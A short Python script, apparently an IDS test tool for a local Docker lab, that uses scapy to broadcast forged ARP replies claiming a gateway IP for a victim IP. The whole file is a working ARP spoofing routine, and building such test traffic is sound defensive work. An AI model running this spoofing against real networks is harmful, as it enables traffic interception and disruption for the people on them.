from __future__ import annotations

import argparse
import time

from scapy.all import ARP, Ether, sendp


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Genera respuestas ARP falsas solo para validar el IDS en la red Docker local."
    )
    parser.add_argument("--victim", default="10.10.10.10", help="IP de la victima.")
    parser.add_argument("--gateway", default="10.10.10.1", help="IP suplantada.")
    parser.add_argument("--count", type=int, default=10, help="Numero de paquetes ARP.")
    parser.add_argument("--delay", type=float, default=0.5, help="Pausa entre paquetes.")
    args = parser.parse_args()

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=args.gateway, pdst=args.victim)
    print(
        f"Enviando {args.count} respuestas ARP falsas: {args.gateway} -> victima {args.victim}",
        flush=True,
    )
    for index in range(1, args.count + 1):
        sendp(pkt, iface="eth0", verbose=False)
        print(f"ARP falso enviado {index}/{args.count}", flush=True)
        time.sleep(args.delay)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
